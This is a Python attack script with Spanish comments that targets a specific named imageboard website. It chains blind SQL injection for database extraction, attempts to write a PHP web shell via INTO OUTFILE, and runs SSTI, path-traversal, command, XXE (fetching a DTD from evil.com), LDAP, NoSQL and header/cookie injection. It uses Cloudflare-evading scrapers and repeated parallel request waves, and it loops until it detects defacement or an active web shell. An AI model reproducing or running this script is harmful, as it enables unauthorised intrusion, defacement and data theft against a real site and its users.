#!/usr/bin/env python3
import cloudscraper
import requests
import time
import threading
import queue
import itertools
import string
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_URL = "https://hispachan.in/"

class ParallelAttack:
    def __init__(self):
        self.scrapers = [cloudscraper.create_scraper() for _ in range(20)]
        self.results = queue.Queue()
        self.success = False
        
    def blind_sqli_extractor(self):
        """Extraer toda la base de datos via Blind SQLi"""
        scraper = self.scrapers[0]
        charset = string.printable.replace("'", "").replace('"', '')
        
        print("[BLIND SQLi] Extracting database...")
        
        # Extraer versión de MySQL
        version = ""
        for pos in range(1, 100):
            for char in charset:
                payload = f"1' AND SUBSTRING(@@version,{pos},1)='{char}'--"
                url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
                try:
                    r = scraper.get(url, timeout=5)
                    if len(r.text) == 5377:
                        version += char
                        print(f"  Version: {version}")
                        break
                except:
                    pass
            if not char:
                break
        
        # Extraer usuario actual
        user = ""
        for pos in range(1, 50):
            for char in charset:
                payload = f"1' AND SUBSTRING(USER(),{pos},1)='{char}'--"
                url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
                try:
                    r = scraper.get(url, timeout=5)
                    if len(r.text) == 5377:
                        user += char
                        print(f"  User: {user}")
                        break
                except:
                    pass
            if not char:
                break
        
        # Intentar escribir archivos
        write_attempts = [
            f"1' AND (SELECT 'HACKED' INTO OUTFILE '/var/www/html/hacked.txt')--",
            f"1' AND (SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/x.php')--",
            f"1' AND (SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '/tmp/passwd.txt')--",
        ]
        
        for wa in write_attempts:
            url = f"{TARGET_URL}?board={urllib.parse.quote(wa)}"
            try:
                scraper.get(url, timeout=5)
                print(f"  Write attempt: {wa[:50]}...")
            except:
                pass
    
    def ssti_mass_test(self):
        """Probar SSTI masivamente"""
        print("[SSTI] Mass testing all parameters...")
        
        # Todos los parámetros posibles
        params = []
        for prefix in ["", "post_", "thread_", "board_", "user_", "admin_"]:
            for base in ["search", "q", "query", "name", "title", "content", "message", "text", "data", "input", "value", "template"]:
                params.append(prefix + base)
        
        # Payloads SSTI para todos los motores
        payloads = [
            "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "*{7*7}",
            "{{config}}", "{{self}}", "{{request}}",
            "{{''.__class__.__mro__}}", 
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        ]
        
        for i, param in enumerate(params):
            scraper = self.scrapers[i % len(self.scrapers)]
            for payload in payloads:
                # GET
                threading.Thread(target=self._test_ssti_get, args=(scraper, param, payload)).start()
                # POST
                threading.Thread(target=self._test_ssti_post, args=(scraper, param, payload)).start()
    
    def _test_ssti_get(self, scraper, param, payload):
        url = f"{TARGET_URL}?{param}={urllib.parse.quote(payload)}"
        try:
            r = scraper.get(url, timeout=5)
            if "49" in r.text or "config" in r.text:
                print(f"  [!] SSTI GET: {param} = {payload[:30]}...")
                self.results.put(("SSTI", param, payload))
        except:
            pass
    
    def _test_ssti_post(self, scraper, param, payload):
        data = {param: payload}
        try:
            r = scraper.post(TARGET_URL, data=data, timeout=5)
            if "49" in r.text:
                print(f"  [!] SSTI POST: {param}")
                self.results.put(("SSTI-POST", param, payload))
        except:
            pass
    
    def waf_bypass_techniques(self):
        """Técnicas avanzadas de bypass de WAF"""
        print("[WAF BYPASS] Testing evasion techniques...")
        
        scraper = self.scrapers[1]
        
        # Técnicas de evasión
        evasions = {
            "Case variation": "SeLeCt",
            "Comments": "/**/",
            "Double encoding": "%2527",
            "Unicode": "\\u0027",
            "Concatenation": "CON" + "CAT",
            "Alternative syntax": "/*!50000SELECT*/",
            "Null bytes": "%00",
            "Line breaks": "%0a",
            "Tab characters": "%09",
            "Space alternatives": "/**_**/",
        }
        
        base_payload = "' OR '1'='1"
        
        for technique, replacement in evasions.items():
            # Aplicar técnica de evasión
            if technique == "Case variation":
                payload = "' Or '1'='1"
            elif technique == "Comments":
                payload = "'/**/OR/**/'1'='1"
            elif technique == "Double encoding":
                payload = "%2527%20OR%20%25271%2527%253D%25271"
            elif technique == "Unicode":
                payload = "\\u0027 OR \\u00271\\u0027=\\u00271"
            else:
                payload = base_payload.replace(" ", replacement)
            
            url = f"{TARGET_URL}?id={urllib.parse.quote(payload)}"
            try:
                r = scraper.get(url, timeout=5)
                if r.status_code != 403:
                    print(f"  [!] WAF Bypass with {technique}: Status {r.status_code}")
            except:
                pass
    
    def header_injection_attack(self):
        """Inyección de headers maliciosos"""
        print("[HEADERS] Injecting malicious headers...")
        
        scraper = self.scrapers[2]
        
        # Headers maliciosos
        headers_list = [
            {"X-Forwarded-For": "127.0.0.1' OR '1'='1"},
            {"User-Agent": "<script>alert(1)</script>"},
            {"Referer": "{{7*7}}"},
            {"X-Original-URL": "/../../../etc/passwd"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-Host": "evil.com"},
            {"X-HTTP-Method-Override": "PUT"},
            {"X-Frame-Options": "GOFORIT"},
            {"Content-Type": "application/x-php"},
        ]
        
        for headers in headers_list:
            try:
                r = scraper.get(TARGET_URL, headers=headers, timeout=5)
                if "49" in r.text or "error" in r.text.lower():
                    print(f"  [!] Header injection worked: {list(headers.keys())[0]}")
            except:
                pass
    
    def cookie_injection(self):
        """Inyección de cookies maliciosas"""
        print("[COOKIES] Testing cookie injection...")
        
        scraper = self.scrapers[3]
        
        cookies = {
            "session": "' OR '1'='1",
            "auth": "{{7*7}}",
            "user": "admin' --",
            "token": "../../../etc/passwd",
            "id": "<?php system($_GET['cmd']); ?>",
        }
        
        try:
            r = scraper.get(TARGET_URL, cookies=cookies, timeout=5)
            if any(x in r.text for x in ["49", "error", "root:"]):
                print("  [!] Cookie injection successful!")
        except:
            pass
    
    def path_traversal_deep(self):
        """Path traversal profundo"""
        print("[PATH] Deep path traversal...")
        
        scraper = self.scrapers[4]
        
        # Generar variaciones de path traversal
        traversals = []
        for depth in range(1, 10):
            traversals.append("../" * depth + "etc/passwd")
            traversals.append("..%2f" * depth + "etc%2fpasswd")
            traversals.append("..%252f" * depth + "etc%252fpasswd")
            traversals.append("..../" * depth + "etc/passwd")
            traversals.append("..;/" * depth + "etc/passwd")
        
        params = ["file", "path", "page", "include", "template", "view", "load", "read"]
        
        for param in params:
            for traversal in traversals:
                url = f"{TARGET_URL}?{param}={urllib.parse.quote(traversal)}"
                try:
                    r = scraper.get(url, timeout=3)
                    if "root:" in r.text:
                        print(f"  [!] Path traversal on {param}: {traversal[:30]}...")
                        return True
                except:
                    pass
    
    def command_injection_vectors(self):
        """Vectores de inyección de comandos"""
        print("[CMD] Testing command injection...")
        
        scraper = self.scrapers[5]
        
        # Diferentes formas de inyectar comandos
        cmd_vectors = [
            "; echo HACKED",
            "| echo HACKED",
            "|| echo HACKED",
            "&& echo HACKED",
            "`echo HACKED`",
            "$(echo HACKED)",
            "\necho HACKED",
            "; echo HACKED #",
            "' ; echo HACKED ; '",
            '" ; echo HACKED ; "',
        ]
        
        params = ["cmd", "exec", "command", "run", "execute", "ping", "host", "url"]
        
        for param in params:
            for vector in cmd_vectors:
                url = f"{TARGET_URL}?{param}={urllib.parse.quote(vector)}"
                try:
                    r = scraper.get(url, timeout=5)
                    if "HACKED" in r.text:
                        print(f"  [!] Command injection on {param}!")
                        return True
                except:
                    pass
    
    def xxe_injection(self):
        """XXE Injection attempts"""
        print("[XXE] Testing XML injection...")
        
        scraper = self.scrapers[6]
        
        xxe_payloads = [
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>""",
            """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><root/>""",
        ]
        
        for payload in xxe_payloads:
            headers = {"Content-Type": "application/xml"}
            try:
                r = scraper.post(TARGET_URL, data=payload, headers=headers, timeout=5)
                if "root:" in r.text:
                    print("  [!] XXE vulnerability found!")
                    return True
            except:
                pass
    
    def ldap_injection(self):
        """LDAP Injection"""
        print("[LDAP] Testing LDAP injection...")
        
        scraper = self.scrapers[7]
        
        ldap_payloads = [
            "*", "*)(&", "*)(|(mail=*", "*)(|(objectclass=*",
            "admin*", "admin*)(&", "*)(uid=*", "*)(|(uid=*",
        ]
        
        params = ["user", "username", "login", "uid", "cn", "search"]
        
        for param in params:
            for payload in ldap_payloads:
                url = f"{TARGET_URL}?{param}={urllib.parse.quote(payload)}"
                try:
                    r = scraper.get(url, timeout=5)
                    if "LDAP" in r.text or "ldap_" in r.text:
                        print(f"  [!] LDAP injection on {param}")
                        return True
                except:
                    pass
    
    def nosql_injection(self):
        """NoSQL Injection"""
        print("[NoSQL] Testing NoSQL injection...")
        
        scraper = self.scrapers[8]
        
        nosql_payloads = [
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '[$ne]=1',
            '[$gt]=',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
        ]
        
        for payload in nosql_payloads:
            # GET
            url = f"{TARGET_URL}?filter={urllib.parse.quote(payload)}"
            try:
                r = scraper.get(url, timeout=5)
                if r.status_code == 200 and len(r.text) > 5000:
                    print("  [!] NoSQL injection possible")
            except:
                pass
            
            # POST
            try:
                r = scraper.post(TARGET_URL, json={"filter": payload}, timeout=5)
                if r.status_code == 200:
                    print("  [!] NoSQL injection via POST")
            except:
                pass
    
    def race_condition_attack(self):
        """Race condition exploitation"""
        print("[RACE] Testing race conditions...")
        
        # Enviar múltiples requests simultáneos
        def send_request(i):
            scraper = self.scrapers[i % len(self.scrapers)]
            payload = f"' OR '1'='1' --"
            url = f"{TARGET_URL}?id={urllib.parse.quote(payload)}"
            try:
                r = scraper.get(url, timeout=2)
                if r.status_code != 403:
                    print(f"  [!] Race condition bypass: Request {i} succeeded")
            except:
                pass
        
        # Lanzar 100 requests simultáneos
        threads = []
        for i in range(100):
            t = threading.Thread(target=send_request, args=(i,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join(timeout=5)
    
    def run_all_attacks(self):
        """Ejecutar todos los ataques en paralelo"""
        print("\n" + "="*60)
        print("MASSIVE PARALLEL ATTACK")
        print("="*60)
        
        attacks = [
            self.blind_sqli_extractor,
            self.ssti_mass_test,
            self.waf_bypass_techniques,
            self.header_injection_attack,
            self.cookie_injection,
            self.path_traversal_deep,
            self.command_injection_vectors,
            self.xxe_injection,
            self.ldap_injection,
            self.nosql_injection,
            self.race_condition_attack,
        ]
        
        # Ejecutar todos los ataques en paralelo
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(attack) for attack in attacks]
            
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=120)
                except Exception as e:
                    pass
        
        # Verificar resultados
        results_list = []
        while not self.results.empty():
            results_list.append(self.results.get())
        
        if results_list:
            print(f"\n[!] Found {len(results_list)} vulnerabilities!")
            for r in results_list[:10]:
                print(f"  - {r}")
        
        # Verificar si el sitio fue modificado
        self.check_success()
    
    def check_success(self):
        """Verificar si logramos modificar el sitio"""
        scraper = self.scrapers[0]
        try:
            r = scraper.get(TARGET_URL, timeout=10)
            if any(x in r.text for x in ["HACKED", "PWNED", "MODIFIED"]):
                print("\n" + "="*60)
                print("[!!!] SUCCESS - WEBSITE MODIFIED!")
                print("="*60)
                self.success = True
                return True
        except:
            pass
        
        # Check webshells
        for shell in ["shell.php", "x.php", "cmd.php", "backdoor.php"]:
            try:
                r = scraper.get(TARGET_URL + shell, timeout=5)
                if r.status_code == 200:
                    print(f"\n[!!!] WEBSHELL ACTIVE: {TARGET_URL}{shell}")
                    self.success = True
                    return True
            except:
                pass
        
        return False

def main():
    attack = ParallelAttack()
    
    while not attack.success:
        print(f"\n[*] Starting new attack wave...")
        attack.run_all_attacks()
        
        if not attack.success:
            print("[*] Attack wave completed. Preparing next wave...")
            time.sleep(2)
    
    print("\n[!!!] OBJECTIVE ACHIEVED - SITE COMPROMISED")

if __name__ == "__main__":
    main()